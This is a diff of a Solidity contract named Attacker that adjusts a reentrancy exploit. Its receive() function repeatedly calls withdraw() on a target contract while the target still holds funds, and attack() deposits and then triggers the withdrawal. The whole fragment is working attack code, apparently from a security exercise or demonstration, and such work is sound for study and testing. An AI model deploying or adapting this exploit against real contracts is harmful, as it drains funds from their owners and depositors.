@@ -18,16 +18,15 @@ contract Attacker {
   }
   
   receive() external payable {
-    if (address(vulnerableContract).balance >= 1 ether) {
-      vulnerableContract.withdraw(1 ether);
+    if (address(vulnerableContract).balance >= msg.value) {
+      vulnerableContract.withdraw();
     }
   }
 
   function attack() external payable {
     require(msg.sender == owner);
-    require(msg.value == 1 ether);
     vulnerableContract.deposit{value: msg.value}();
-    vulnerableContract.withdraw(msg.value);
+    vulnerableContract.withdraw();
   }
 
   function collect() external {
